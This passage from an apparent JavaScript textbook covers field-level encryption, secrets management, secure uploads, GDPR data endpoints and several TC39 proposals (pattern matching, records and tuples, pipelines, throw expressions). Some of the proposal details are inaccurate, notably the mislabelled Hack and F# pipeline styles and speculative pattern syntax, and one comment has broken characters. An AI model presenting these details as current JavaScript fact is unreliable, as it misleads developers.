    const cipher = crypto.createCipheriv('aes-256-gcm', this.key, iv);
    
    let encrypted = cipher.update(String(value), 'utf8', 'base64');
    encrypted += cipher.final('base64');
    
    const authTag = cipher.getAuthTag().toString('base64');
    
    return `${iv.toString('base64')}:${authTag}:${encrypted}`;
  }
  
  decrypt(value) {
    if (!value) return null;
    
    const [ivB64, authTagB64, encrypted] = value.split(':');
    
    const iv = Buffer.from(ivB64, 'base64');
    const authTag = Buffer.from(authTagB64, 'base64');
    
    const decipher = crypto.createDecipheriv('aes-256-gcm', this.key, iv);
    decipher.setAuthTag(authTag);
    
    let decrypted = decipher.update(encrypted, 'base64', 'utf8');
    decrypted += decipher.final('utf8');
    
    return decrypted;
  }
}

// Mongoose plugin for field encryption
function encryptionPlugin(schema, options) {
  const encryptedFields = new Map();
  
  // Identify encrypted fields
  for (const [path, schemaType] of Object.entries(schema.paths)) {
    if (schemaType.options.encrypt) {
      const encryptor = new EncryptedField(process.env.ENCRYPTION_KEY);
      encryptedFields.set(path, encryptor);
    }
  }
  
  // Encrypt before save
  schema.pre('save', function(next) {
    for (const [path, encryptor] of encryptedFields) {
      if (this.isModified(path) && this[path]) {
        this[path] = encryptor.encrypt(this[path]);
      }
    }
    next();
  });
  
  // Decrypt after find
  schema.post('find', function(docs) {
    docs.forEach(doc => {
      for (const [path, encryptor] of encryptedFields) {
        if (doc[path]) {
          doc[path] = encryptor.decrypt(doc[path]);
        }
      }
    });
  });
}

// Usage
const userSchema = new mongoose.Schema({
  name: String,
  email: String,
  ssn: { type: String, encrypt: true },
  creditCard: { type: String, encrypt: true }
});

userSchema.plugin(encryptionPlugin);
```

### Secure Storage Practices

Store sensitive data securely in databases and file systems.

#### Database Security

```javascript
// 1. Use parameterized queries (prevents SQL injection)
const query = 'SELECT * FROM users WHERE id = ?';
db.query(query, [userId]);

// 2. Encrypt sensitive columns
CREATE TABLE users (
  id INT PRIMARY KEY,
  email VARCHAR(255),
  ssn VARBINARY(255),  -- Store encrypted
  credit_card VARBINARY(255)  -- Store encrypted
);

// 3. Use database-level encryption
-- Enable transparent data encryption (TDE)
ALTER DATABASE mydb SET ENCRYPTION ON;

// 4. Implement access controls
GRANT SELECT, INSERT, UPDATE ON users TO 'app_user'@'localhost';
REVOKE DELETE ON users FROM 'app_user'@'localhost';

// 5. Regular backups with encryption
mongodump --out=/backup --gzip --archive=/backup/db.gz
openssl enc -aes-256-cbc -salt -in db.gz -out db.gz.enc
```

#### Secrets Management

```javascript
// DON'T: Store secrets in code
const API_KEY = 'sk-1234567890abcdef';  // Never!

// DO: Use environment variables
const API_KEY = process.env.API_KEY;

// BETTER: Use secrets manager
const AWS = require('aws-sdk');
const secretsManager = new AWS.SecretsManager();

async function getSecret(secretName) {
  try {
    const data = await secretsManager.getSecretValue({ 
      SecretId: secretName 
    }).promise();
    
    return JSON.parse(data.SecretString);
  } catch (error) {
    console.error('Error retrieving secret:', error);
    throw error;
  }
}

// Usage
const secrets = await getSecret('prod/api-keys');
const API_KEY = secrets.API_KEY;

// Or use HashiCorp Vault
const vault = require('node-vault')({
  endpoint: process.env.VAULT_ADDR,
  token: process.env.VAULT_TOKEN
});

async function getVaultSecret(path) {
  const result = await vault.read(path);
  return result.data;
}
```

#### File Upload Security

```javascript
const multer = require('multer');
const path = require('path');
const crypto = require('crypto');

// Secure file upload configuration
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    // Store outside web root
    cb(null, '/var/app/uploads');
  },
  filename: (req, file, cb) => {
    // Generate random filename
    const randomName = crypto.randomBytes(16).toString('hex');
    const ext = path.extname(file.originalname);
    cb(null, `${randomName}${ext}`);
  }
});

const fileFilter = (req, file, cb) => {
  // Whitelist allowed types
  const allowedTypes = ['image/jpeg', 'image/png', 'image/gif', 'application/pdf'];
  
  if (allowedTypes.includes(file.mimetype)) {
    cb(null, true);
  } else {
    cb(new Error('Invalid file type'), false);
  }
};

const upload = multer({
  storage: storage,
  fileFilter: fileFilter,
  limits: {
    fileSize: 5 * 1024 * 1024,  // 5MB max
    files: 1
  }
});

// Upload endpoint
app.post('/upload', upload.single('file'), async (req, res) => {
  if (!req.file) {
    return res.status(400).json({ error: 'No file uploaded' });
  }
  
  // Validate file content (check magic bytes)
  const fileBuffer = fs.readFileSync(req.file.path);
  const fileType = await fileTypeFromBuffer(fileBuffer);
  
  if (!fileType || !['image/jpeg', 'image/png', 'image/gif'].includes(fileType.mime)) {
    fs.unlinkSync(req.file.path);
    return res.status(400).json({ error: 'Invalid file content' });
  }
  
  // Scan for malware (integrate with ClamAV or similar)
  const isSafe = await scanFile(req.file.path);
  
  if (!isSafe) {
    fs.unlinkSync(req.file.path);
    return res.status(400).json({ error: 'File failed security scan' });
  }
  
  // Store metadata
  await db.files.create({
    userId: req.user.id,
    filename: req.file.filename,
    originalName: req.file.originalname,
    mimetype: req.file.mimetype,
    size: req.file.size,
    uploadedAt: new Date()
  });
  
  res.json({ 
    success: true,
    fileId: req.file.filename
  });
});

// Serve files securely
app.get('/files/:fileId', authenticateToken, async (req, res) => {
  const { fileId } = req.params;
  
  // Verify ownership
  const file = await db.files.findOne({ filename: fileId });
  
  if (!file) {
    return res.status(404).json({ error: 'File not found' });
  }
  
  if (file.userId !== req.user.sub) {
    return res.status(403).json({ error: 'Access denied' });
  }
  
  // Serve file
  const filePath = path.join('/var/app/uploads', fileId);
  res.sendFile(filePath);
});
```

### Privacy Considerations

Respect user privacy and minimize data collection.

#### Privacy by Design

```javascript
// 1. Data minimization - collect only what's needed
const userSchema = new mongoose.Schema({
  email: { type: String, required: true },
  name: { type: String, required: true },
  // Don't collect: birthdate, address, phone unless necessary
});

// 2. Purpose limitation - use data only for stated purpose
app.post('/newsletter/subscribe', async (req, res) => {
  const { email } = req.body;
  
  // Store consent
  await db.subscriptions.create({
    email,
    purpose: 'newsletter',
    consentedAt: new Date(),
    ipAddress: req.ip
  });
  
  // Don't use email for other purposes without consent
});

// 3. Data retention - delete data when no longer needed
async function cleanupOldData() {
  // Delete old logs
  await db.logs.deleteMany({
    createdAt: { $lt: new Date(Date.now() - 90 * 24 * 60 * 60 * 1000) }
  });
  
  // Anonymize old user data
  await db.users.updateMany(
    {
      deletedAt: { $lt: new Date(Date.now() - 30 * 24 * 60 * 60 * 1000) }
    },
    {
      email: 'deleted@example.com',
      name: 'Deleted User',
      phone: null,
      address: null
    }
  );
}

// Run daily
setInterval(cleanupOldData, 24 * 60 * 60 * 1000);

// 4. User control - allow users to manage their data
app.get('/api/my-data', authenticateToken, async (req, res) => {
  const userId = req.user.sub;
  
  // Provide all user data
  const userData = await db.users.findById(userId);
  const userPosts = await db.posts.find({ userId });
  const userComments = await db.comments.find({ userId });
  
  res.json({
    profile: userData,
    posts: userPosts,
    comments: userComments
  });
});

app.delete('/api/my-account', authenticateToken, async (req, res) => {
  const userId = req.user.sub;
  
  // Delete or anonymize user data
  await db.users.updateOne(
    { id: userId },
    {
      deletedAt: new Date(),
      email: `deleted-${userId}@example.com`,
      name: 'Deleted User'
    }
  );
  
  res.json({ success: true });
});
```

### GDPR Compliance Basics

General Data Protection Regulation requirements for EU users.

#### Consent Management

```javascript
// Cookie consent
app.get('/', (req, res) => {
  res.send(`
    <div id="cookie-banner" style="display: none;">
      <p>We use cookies to improve your experience.</p>
      <button onclick="acceptCookies()">Accept</button>
      <button onclick="rejectCookies()">Reject</button>
      <a href="/privacy-policy">Learn more</a>
    </div>
    
    <script>
      if (!localStorage.getItem('cookieConsent')) {
        document.getElementById('cookie-banner').style.display = 'block';
      }
      
      function acceptCookies() {
        localStorage.setItem('cookieConsent', 'accepted');
        document.getElementById('cookie-banner').style.display = 'none';
        // Enable analytics
      }
      
      function rejectCookies() {
        localStorage.setItem('cookieConsent', 'rejected');
        document.getElementById('cookie-banner').style.display = 'none';
      }
    </script>
  `);
});

// Track consent in database
const consentSchema = new mongoose.Schema({
  userId: String,
  consentType: String,  // 'necessary', 'analytics', 'marketing'
  granted: Boolean,
  timestamp: Date,
  ipAddress: String,
  userAgent: String
});

app.post('/api/consent', authenticateToken, async (req, res) => {
  const { consentType, granted } = req.body;
  
  await db.consents.create({
    userId: req.user.sub,
    consentType,
    granted,
    timestamp: new Date(),
    ipAddress: req.ip,
    userAgent: req.get('user-agent')
  });
  
  res.json({ success: true });
});
```

#### Right to Access (Data Portability)

```javascript
// Export all user data
app.get('/api/export-data', authenticateToken, async (req, res) => {
  const userId = req.user.sub;
  
  // Gather all user data
  const [user, posts, comments, orders, activity] = await Promise.all([
    db.users.findById(userId),
    db.posts.find({ userId }),
    db.comments.find({ userId }),
    db.orders.find({ userId }),
    db.activity.find({ userId })
  ]);
  
  // Create JSON export
  const exportData = {
    profile: {
      email: user.email,
      name: user.name,
      createdAt: user.createdAt
    },
    posts: posts,
    comments: comments,
    orders: orders,
    activity: activity,
    exportedAt: new Date()
  };
  
  // Create downloadable file
  const filename = `user-data-${userId}-${Date.now()}.json`;
  const filepath = path.join('/tmp', filename);
  
  fs.writeFileSync(filepath, JSON.stringify(exportData, null, 2));
  
  res.download(filepath, filename, (err) => {
    fs.unlinkSync(filepath);
  });
});
```

#### Right to Erasure (Right to be Forgotten)

```javascript
// Delete all user data
app.delete('/api/delete-account', authenticateToken, async (req, res) => {
  const userId = req.user.sub;
  const { password } = req.body;
  
  // Verify password
  const user = await db.users.findById(userId);
  const validPassword = await bcrypt.compare(password, user.passwordHash);
  
  if (!validPassword) {
    return res.status(401).json({ error: 'Invalid password' });
  }
  
  // Delete or anonymize data
  await Promise.all([
    // Delete personal data
    db.users.deleteOne({ id: userId }),
    
    // Anonymize posts (keep content but remove attribution)
    db.posts.updateMany(
      { userId },
      { userId: null, authorName: 'Deleted User' }
    ),
    
    // Delete private data
    db.messages.deleteMany({ userId }),
    db.orders.deleteMany({ userId }),
    db.activity.deleteMany({ userId })
  ]);
  
  // Log deletion for compliance
  await db.deletionLogs.create({
    userId,
    deletedAt: new Date(),
    ipAddress: req.ip
  });
  
  res.json({ success: true });
});
```

#### Privacy Policy and Terms

```javascript
// Require acceptance of updated policies
app.use(async (req, res, next) => {
  if (req.user) {
    const user = await db.users.findById(req.user.sub);
    const latestPolicyVersion = '2024-01-01';
    
    if (user.acceptedPolicyVersion !== latestPolicyVersion) {
      return res.status(403).json({
        error: 'Please accept the updated privacy policy',
        policyUrl: '/privacy-policy',
        policyVersion: latestPolicyVersion
      });
    }
  }
  
  next();
});

app.post('/api/accept-policy', authenticateToken, async (req, res) => {
  const { policyVersion } = req.body;
  
  await db.users.updateOne(
    { id: req.user.sub },
    {
      acceptedPolicyVersion: policyVersion,
      acceptedPolicyAt: new Date()
    }
  );
  
  res.json({ success: true });
});
```

---

## Summary

This document covered Authentication, Authorization, and Data Protection:

**Authentication & Authorization:**

- **JWT**: Token structure, creation/verification, refresh tokens, best practices, security considerations
- **OAuth 2.0/OpenID Connect**: Authorization code flow, PKCE, Passport.js integration
- **Session Management**: Redis storage, security best practices, session regeneration, timeout handling
- **Password Hashing**: bcrypt usage, strength validation, password reset flow
- **Multi-factor Authentication**: TOTP implementation, SMS verification, backup codes

**Data Protection:**

- **Encryption**: TLS/HTTPS configuration, encryption at rest (AES-256-GCM), field-level encryption, key rotation
- **Secure Storage**: Database security, secrets management, secure file uploads
- **Privacy**: Data minimization, purpose limitation, retention policies, user control
- **GDPR Compliance**: Consent management, data portability, right to erasure, policy acceptance

Security requires layers of protection and ongoing vigilance to protect user data and maintain trust.

---

**Related Topics:**

- Penetration Testing
- Security Audits
- Compliance (HIPAA, PCI-DSS)
- Zero Trust Architecture
- API Security

## 24.5 Security Summary

| Vulnerability | Prevention |
|--------------|------------|
| **XSS** | Escape output, use CSP, avoid `innerHTML` |
| **CSRF** | CSRF tokens, SameSite cookies |
| **Injection** | Parameterized queries, input validation |
| **Prototype Pollution** | Object.create(null), freeze prototypes |
| **Sensitive Data** | HTTPS, secure cookies, encryption |

---

**End of Chapter 24: Security Best Practices**


# 25-Other-Proposals-and-Future-Features.md

# 25 Other Proposals and Future Features

---

# Future Features & Proposals


**Note:** These are proposals in various stages of the TC39 process. Syntax and behavior may change before final standardization. Use Babel or TypeScript to experiment with these features.

**TC39 Process Stages:**

- **Stage 0**: Strawperson - Initial idea
- **Stage 1**: Proposal - Formal proposal with champion
- **Stage 2**: Draft - Precise syntax, semantics
- **Stage 3**: Candidate - Spec complete, needs implementation feedback
- **Stage 4**: Finished - Ready for inclusion in standard

---

## 25.1 Pattern Matching (Stage 1)

Pattern matching provides a more expressive way to handle conditional logic and destructuring.

### Match Expression

The `match` expression matches a value against patterns and executes corresponding code.

#### Basic Match Syntax

```javascript
// Proposed syntax (not yet available)
const result = match (value) {
  when (pattern) -> expression
  when (pattern) -> expression
  default -> expression
}

// Example: Simple value matching
const result = match (statusCode) {
  when (200) -> 'Success'
  when (404) -> 'Not Found'
  when (500) -> 'Server Error'
  default -> 'Unknown Status'
};

// Example: Multiple patterns
const message = match (code) {
  when (200 | 201 | 204) -> 'Success'
  when (400 | 401 | 403) -> 'Client Error'
  when (500 | 502 | 503) -> 'Server Error'
  default -> 'Unknown'
};

// Current JavaScript equivalent
let result;
switch (statusCode) {
  case 200:
    result = 'Success';
    break;
  case 404:
    result = 'Not Found';
    break;
  case 500:
    result = 'Server Error';
    break;
  default:
    result = 'Unknown Status';
}

// Or with object lookup
const statusMessages = {
  200: 'Success',
  404: 'Not Found',
  500: 'Server Error'
};
const result = statusMessages[statusCode] || 'Unknown Status';
```

#### Destructuring Patterns

```javascript
// Match with destructuring
const describe = match (shape) {
  when ({ type: 'circle', radius }) -> `Circle with radius ${radius}`
  when ({ type: 'rectangle', width, height }) -> `Rectangle ${width}x${height}`
  when ({ type: 'square', side }) -> `Square ${side}x${side}`
  default -> 'Unknown shape'
};

// Example usage
describe({ type: 'circle', radius: 5 });
// "Circle with radius 5"

describe({ type: 'rectangle', width: 10, height: 20 });
// "Rectangle 10x20"

// Current equivalent
function describe(shape) {
  if (shape.type === 'circle') {
    return `Circle with radius ${shape.radius}`;
  } else if (shape.type === 'rectangle') {
    return `Rectangle ${shape.width}x${shape.height}`;
  } else if (shape.type === 'square') {
    return `Square ${shape.side}x${shape.side}`;
  }
  return 'Unknown shape';
}
```

#### Array Pattern Matching

```javascript
// Match array patterns
const process = match (arr) {
  when ([]) -> 'Empty array'
  when ([x]) -> `Single element: ${x}`
  when ([x, y]) -> `Two elements: ${x}, ${y}`
  when ([first, ...rest]) -> `First: ${first}, Rest: ${rest.length} items`
  default -> 'Array'
};

// Example
process([]);           // "Empty array"
process([1]);          // "Single element: 1"
process([1, 2]);       // "Two elements: 1, 2"
process([1, 2, 3, 4]); // "First: 1, Rest: 3 items"

// Current equivalent
function process(arr) {
  if (arr.length === 0) {
    return 'Empty array';
  } else if (arr.length === 1) {
    return `Single element: ${arr[0]}`;
  } else if (arr.length === 2) {
    return `Two elements: ${arr[0]}, ${arr[1]}`;
  } else {
    const [first, ...rest] = arr;
    return `First: ${first}, Rest: ${rest.length} items`;
  }
  return 'Array';
}
```

#### Guards (Conditional Patterns)

```javascript
// Match with guards (when clauses)
const categorize = match (num) {
  when (n) if (n < 0) -> 'Negative'
  when (n) if (n === 0) -> 'Zero'
  when (n) if (n > 0 && n < 10) -> 'Single digit'
  when (n) if (n >= 10 && n < 100) -> 'Double digit'
  default -> 'Large number'
};

// Example
categorize(-5);  // "Negative"
categorize(0);   // "Zero"
categorize(7);   // "Single digit"
categorize(42);  // "Double digit"
categorize(999); // "Large number"

// Current equivalent
function categorize(num) {
  if (num < 0) return 'Negative';
  if (num === 0) return 'Zero';
  if (num > 0 && num < 10) return 'Single digit';
  if (num >= 10 && num < 100) return 'Double digit';
  return 'Large number';
}
```

### Pattern Syntax

Different types of patterns available in match expressions.

#### Literal Patterns

```javascript
// Exact value matching
const result = match (value) {
  when (42) -> 'The answer'
  when ('hello') -> 'Greeting'
  when (true) -> 'Boolean true'
  when (null) -> 'Null value'
  when (undefined) -> 'Undefined value'
  default -> 'Something else'
};
```

#### Type Patterns

```javascript
// Match by type
const describe = match (value) {
  when (Number) -> `Number: ${value}`
  when (String) -> `String: ${value}`
  when (Boolean) -> `Boolean: ${value}`
  when (Array) -> `Array with ${value.length} items`
  when (Object) -> 'Object'
  default -> 'Unknown type'
};

// Example
describe(42);           // "Number: 42"
describe('hello');      // "String: hello"
describe([1, 2, 3]);    // "Array with 3 items"

// Current equivalent using typeof/instanceof
function describe(value) {
  if (typeof value === 'number') return `Number: ${value}`;
  if (typeof value === 'string') return `String: ${value}`;
  if (typeof value === 'boolean') return `Boolean: ${value}`;
  if (Array.isArray(value)) return `Array with ${value.length} items`;
  if (typeof value === 'object') return 'Object';
  return 'Unknown type';
}
```

#### Object Patterns

```javascript
// Nested object matching
const processUser = match (user) {
  when ({ role: 'admin', verified: true }) -> 
    'Full admin access'
  
  when ({ role: 'admin', verified: false }) -> 
    'Admin access pending verification'
  
  when ({ role: 'user', premium: true }) -> 
    'Premium user'
  
  when ({ role: 'user' }) -> 
    'Standard user'
  
  default -> 
    'Guest'
};

// Nested destructuring
const getAddress = match (person) {
  when ({ address: { city, country } }) -> 
    `${city}, ${country}`
  
  when ({ address: { city } }) -> 
    city
  
  default -> 
    'No address'
};
```

#### Range Patterns

```javascript
// Range matching (proposed syntax)
const classify = match (age) {
  when (0..12) -> 'Child'
  when (13..19) -> 'Teenager'
  when (20..64) -> 'Adult'
  when (65..) -> 'Senior'
  default -> 'Invalid age'
};

// Current equivalent
function classify(age) {
  if (age >= 0 && age <= 12) return 'Child';
  if (age >= 13 && age <= 19) return 'Teenager';
  if (age >= 20 && age <= 64) return 'Adult';
  if (age >= 65) return 'Senior';
  return 'Invalid age';
}
```

#### Real-World Examples

```javascript
// Example 1: HTTP Response Handler
const handleResponse = match (response) {
  when ({ status: 200, data }) -> 
    ({ success: true, data })
  
  when ({ status: 201, data }) -> 
    ({ success: true, created: true, data })
  
  when ({ status: 400, error }) -> 
    ({ success: false, error: 'Bad Request', message: error })
  
  when ({ status: 401 }) -> 
    ({ success: false, error: 'Unauthorized', redirect: '/login' })
  
  when ({ status: 404 }) -> 
    ({ success: false, error: 'Not Found' })
  
  when ({ status: code }) if (code >= 500) -> 
    ({ success: false, error: 'Server Error', retry: true })
  
  default -> 
    ({ success: false, error: 'Unknown Error' })
};

// Example 2: Redux Reducer
const reducer = (state, action) => match (action) {
  when ({ type: 'INCREMENT' }) -> 
    ({ ...state, count: state.count + 1 })
  
  when ({ type: 'DECREMENT' }) -> 
    ({ ...state, count: state.count - 1 })
  
  when ({ type: 'SET_VALUE', payload }) -> 
    ({ ...state, count: payload })
  
  when ({ type: 'RESET' }) -> 
    ({ count: 0 })
  
  default -> 
    state
};

// Example 3: Command Parser
const parseCommand = match (input) {
  when ({ command: 'add', args: [x, y] }) -> 
    x + y
  
  when ({ command: 'subtract', args: [x, y] }) -> 
    x - y
  
  when ({ command: 'multiply', args: [x, y] }) -> 
    x * y
  
  when ({ command: 'divide', args: [x, y] }) if (y !== 0) -> 
    x / y
  
  when ({ command: 'divide', args: [x, 0] }) -> 
    throw new Error('Division by zero')
  
  default -> 
    throw new Error('Unknown command')
};
```

---

## 25.2 Records and Tuples (Stage 2)

Records and Tuples are deeply immutable data structures with value semantics.

### Immutable Data Structures

Records are immutable objects; Tuples are immutable arrays.

#### Record Syntax

```javascript
// Record syntax (proposed)
const person = #{
  name: 'Alice',
  age: 30,
  address: #{
    city: 'New York',
    country: 'USA'
  }
};

// Records are deeply immutable
person.age = 31; // TypeError: Cannot assign to read only property

// Create new record with changes
const older = #{ ...person, age: 31 };

console.log(person.age); // 30
console.log(older.age);  // 31

// Records can only contain primitives, other records, and tuples
const valid = #{
  number: 42,
  string: 'hello',
  boolean: true,
  record: #{ nested: 'value' },
  tuple: #[1, 2, 3]
};

// Invalid - cannot contain objects/arrays
const invalid = #{
  object: { mutable: 'data' },     // Error
  array: [1, 2, 3],                // Error
  function: () => {}               // Error
};
```

#### Tuple Syntax

```javascript
// Tuple syntax (proposed)
const coordinates = #[40.7128, -74.0060];

// Tuples are immutable
coordinates[0] = 40.7589; // TypeError: Cannot assign to read only property
coordinates.push(100);    // TypeError: coordinates.push is not a function

// Create new tuple with changes
const newCoordinates = #[40.7589, ...coordinates.slice(1)];

console.log(coordinates);    // #[40.7128, -74.0060]
console.log(newCoordinates); // #[40.7589, -74.0060]

// Tuples can only contain primitives, records, and tuples
const validTuple = #[
  1,
  'string',
  true,
  #{ key: 'value' },
  #[1, 2, 3]
];

// Invalid - cannot contain mutable objects
const invalidTuple = #[
  { mutable: 'object' },  // Error
  [1, 2, 3],             // Error
  new Date()             // Error
];
```

#### Working with Records and Tuples

```javascript
// Accessing properties (same as objects/arrays)
const person = #{
  name: 'Alice',
  age: 30,
  hobbies: #['reading', 'coding']
};

console.log(person.name);        // "Alice"
console.log(person.hobbies[0]);  // "reading"

// Spread syntax
const updated = #{
  ...person,
  age: 31,
  city: 'Boston'
};

// Nested updates (need to spread each level)
const withNewHobby = #{
  ...person,
  hobbies: #[...person.hobbies, 'gaming']
};

// Destructuring works
const { name, age } = person;
const [first, second] = person.hobbies;

// Object methods work
console.log(Object.keys(person));     // ['name', 'age', 'hobbies']
console.log(Object.values(person));   // ['Alice', 30, #['reading', 'coding']]

// Array methods work
const doubled = person.hobbies.map(h => h.toUpperCase());
// Returns regular array, not tuple
```

#### Updating Records and Tuples

```javascript
// Shallow update
const person = #{ name: 'Alice', age: 30 };
const updated = #{ ...person, age: 31 };

// Deep update helper
function updateRecord(record, path, value) {
  if (path.length === 0) return value;
  
  const [head, ...tail] = path;
  return #{
    ...record,
    [head]: updateRecord(record[head], tail, value)
  };
}

const nested = #{
  user: #{
    profile: #{
      name: 'Alice',
      age: 30
    }
  }
};

const updated = updateRecord(nested, ['user', 'profile', 'age'], 31);
// #{
//   user: #{
//     profile: #{
//       name: 'Alice',
//       age: 31
//     }
//   }
// }

// Tuple updates
const tuple = #[1, 2, 3, 4, 5];

const withoutFirst = #[...tuple.slice(1)];     // #[2, 3, 4, 5]
const withoutLast = #[...tuple.slice(0, -1)];  // #[1, 2, 3, 4]
const updated = #[
  ...tuple.slice(0, 2),
  99,
  ...tuple.slice(3)
];  // #[1, 2, 99, 4, 5]
```

### Deep Equality

Records and Tuples use value equality instead of reference equality.

#### Equality Comparison

```javascript
// Objects use reference equality
const obj1 = { x: 1, y: 2 };
const obj2 = { x: 1, y: 2 };
console.log(obj1 === obj2);  // false (different references)

// Records use value equality
const rec1 = #{ x: 1, y: 2 };
const rec2 = #{ x: 1, y: 2 };
console.log(rec1 === rec2);  // true (same values)

// Deep equality
const deep1 = #{
  a: 1,
  b: #{
    c: 2,
    d: #[3, 4]
  }
};

const deep2 = #{
  a: 1,
  b: #{
    c: 2,
    d: #[3, 4]
  }
};

console.log(deep1 === deep2);  // true

// Works in Sets and Maps
const set = new Set();
set.add(#{ x: 1 });
set.add(#{ x: 1 });  // Same value, not added twice
console.log(set.size);  // 1

const map = new Map();
const key1 = #{ id: 1 };
const key2 = #{ id: 1 };

map.set(key1, 'value1');
console.log(map.get(key2));  // "value1" (same key!)
```

#### Use Cases

```javascript
// 1. React state (automatic memoization)
function Counter() {
  const [state, setState] = useState(#{
    count: 0,
    history: #[]
  });
  
  const increment = () => {
    setState(#{
      count: state.count + 1,
      history: #[...state.history, state.count]
    });
  };
  
  // Record equality enables automatic optimization
  return <div>{state.count}</div>;
}

// 2. Redux state (immutability by default)
const initialState = #{
  users: #[],
  posts: #[],
  ui: #{
    loading: false,
    error: null
  }
};

function reducer(state = initialState, action) {
  match (action) {
    when ({ type: 'ADD_USER', payload }) ->
      #{ ...state, users: #[...state.users, payload] }
    
    when ({ type: 'SET_LOADING', payload }) ->
      #{ ...state, ui: #{ ...state.ui, loading: payload } }
    
    default ->
      state
  }
}

// 3. Configuration objects
const config = #{
  api: #{
    baseURL: 'https://api.example.com',
    timeout: 5000,
    headers: #{
      'Content-Type': 'application/json'
    }
  },
  features: #{
    darkMode: true,
    analytics: false
  }
};

// Config is guaranteed immutable
// Can safely share across modules

// 4. Caching with complex keys
const cache = new Map();

function expensiveOperation(params) {
  const key = #{ ...params };  // Record as cache key
  
  if (cache.has(key)) {
    return cache.get(key);
  }
  
  const result = compute(params);
  cache.set(key, result);
  return result;
}

// Same parameters always hit cache
expensiveOperation({ x: 1, y: 2 });
expensiveOperation({ x: 1, y: 2 });  // Cache hit!
```

#### Conversion Between Objects and Records

```javascript
// Convert object to record (proposed)
const obj = { x: 1, y: 2 };
const rec = Record(obj);  // #{ x: 1, y: 2 }

// Convert record to object
const record = #{ x: 1, y: 2 };
const object = Object(record);  // { x: 1, y: 2 }

// Deep conversion
function toRecord(value) {
  if (typeof value !== 'object' || value === null) {
    return value;
  }
  
  if (Array.isArray(value)) {
    return Tuple(...value.map(toRecord));
  }
  
  const entries = Object.entries(value).map(([k, v]) => [k, toRecord(v)]);
  return Record(Object.fromEntries(entries));
}

const nested = {
  a: 1,
  b: {
    c: 2,
    d: [3, 4]
  }
};

const nestedRecord = toRecord(nested);
// #{ a: 1, b: #{ c: 2, d: #[3, 4] } }
```

---

## 25.3 Pipeline Operator (Stage 2)

The pipeline operator `|>` enables cleaner function chaining.

### Function Chaining with `|>`

Pipeline operator passes the result of one expression as an argument to the next.

#### Basic Pipeline

```javascript
// Proposed syntax
const result = value
  |> function1
  |> function2
  |> function3;

// Equivalent to
const result = function3(function2(function1(value)));

// Example: String processing
const processText = text
  |> trim
  |> toLowerCase
  |> removeSpecialChars
  |> capitalize;

// Current equivalent
const processText = capitalize(
  removeSpecialChars(
    toLowerCase(
      trim(text)
    )
  )
);

// Or with intermediate variables
const trimmed = trim(text);
const lower = toLowerCase(trimmed);
const cleaned = removeSpecialChars(lower);
const final = capitalize(cleaned);
```

#### Arrow Functions in Pipeline

```javascript
// With arrow functions
const result = value
  |> (x => x * 2)
  |> (x => x + 10)
  |> (x => Math.sqrt(x));

// Example: Data transformation
const users = [
  { name: 'Alice', age: 30 },
  { name: 'Bob', age: 25 },
  { name: 'Charlie', age: 35 }
];

const result = users
  |> (arr => arr.filter(u => u.age > 25))
  |> (arr => arr.map(u => u.name))
  |> (arr => arr.join(', '));

// "Alice, Charlie"

// Current equivalent
const result = users
  .filter(u => u.age > 25)
  .map(u => u.name)
  .join(', ');
```

#### Partial Application with Pipeline

```javascript
// Hack pipe (F#-style) - requires partial application
const add = x => y => x + y;
const multiply = x => y => x * y;

const result = 5
  |> add(10)
  |> multiply(2)
  |> Math.sqrt;

// Result: Math.sqrt(multiply(2)(add(10)(5)))
// 5 + 10 = 15
// 15 * 2 = 30
// sqrt(30) â‰ˆ 5.48

// Smart pipe (Babel proposal) - auto-wraps in arrow
const result = 5
  |> add(10, %)      // % is placeholder
  |> multiply(2, %)
  |> Math.sqrt(%);

// Example: HTTP request pipeline
const data = '/api/users'
  |> fetch(%)
  |> await %
  |> %.json()
  |> await %
  |> %.filter(u => u.active)
  |> %.map(u => u.name);

// Current equivalent
const response = await fetch('/api/users');
const json = await response.json();
const active = json.filter(u => u.active);
const data = active.map(u => u.name);
```

#### Real-World Examples

```javascript
// Example 1: Text processing
function processArticle(text) {
  return text
    |> removeHtml
    |> normalizeWhitespace
    |> splitIntoParagraphs
    |> (paragraphs => paragraphs.filter(p => p.length > 0))
    |> (paragraphs => paragraphs.map(extractSummary))
    |> (summaries => summaries.join('\n\n'));
}

// Example 2: Validation pipeline
const validateUser = input
  |> sanitizeInput
  |> checkRequired(['name', 'email', 'age'])
  |> validateEmail('email')
  |> validateRange('age', 0, 150)
  |> (result => result.errors.length === 0 ? { valid: true, data: result.data } : { valid: false, errors: result.errors });

// Example 3: Data aggregation
const report = rawData
  |> parseCSV
  |> filterInvalidRows
  |> groupByCategory
  |> calculateTotals
  |> sortByValue
  |> formatAsTable
  |> addHeaders
  |> generatePDF;

// Example 4: Math calculations
const calculatePrice = basePrice
  |> applyDiscount(0.1)
  |> addTax(0.2)
  |> roundToCents
  |> formatCurrency('USD');

// Example 5: Async pipeline
async function fetchUserData(userId) {
  return userId
    |> fetchUser
    |> await %
    |> (user => user.id)
    |> fetchPosts
    |> await %
    |> (posts => posts.filter(p => p.published))
    |> (posts => posts.map(extractSummary))
    |> await Promise.all(%)
    |> (summaries => ({ userId, summaries }));
}
```

#### Pipeline with Side Effects

```javascript
// Tap function for side effects
const tap = fn => value => {
  fn(value);
  return value;
};

const result = data
  |> processData
  |> tap(console.log)  // Log intermediate result
  |> validateData
  |> tap(saveToDatabase)  // Save to DB
  |> formatResponse;

// Example: Debugging pipeline
const debugPipeline = value
  |> tap(x => console.log('Input:', x))
  |> transform1
  |> tap(x => console.log('After transform1:', x))
  |> transform2
  |> tap(x => console.log('After transform2:', x))
  |> transform3
  |> tap(x => console.log('Final:', x));
```

---

## 25.4 Throw Expressions (Stage 2)

Throw expressions allow `throw` to be used in expression contexts.

### `throw` as Expression

Currently, `throw` is a statement. The proposal makes it an expression.

#### Conditional Expressions

```javascript
// Currently (throws as statement)
function getUser(id) {
  if (!id) {
    throw new Error('ID is required');
  }
  return db.users.find(id);
}

// With throw expressions (proposed)
const getUser = (id) => 
  id ? db.users.find(id) : throw new Error('ID is required');

// Ternary operator
const value = condition 
  ? computeValue() 
  : throw new Error('Invalid condition');

// Example: Parameter validation
const processData = (data) =>
  data 
    ? transformData(data) 
    : throw new TypeError('Data is required');
```

#### Default Parameters

```javascript
// Currently
function createUser(name, email) {
  if (!email) {
    throw new Error('Email is required');
  }
  return { name, email };
}

// With throw expressions (proposed)
function createUser(
  name,
  email = throw new Error('Email is required')
) {
  return { name, email };
}

// Arrow function with defaults
const divide = (
  a,
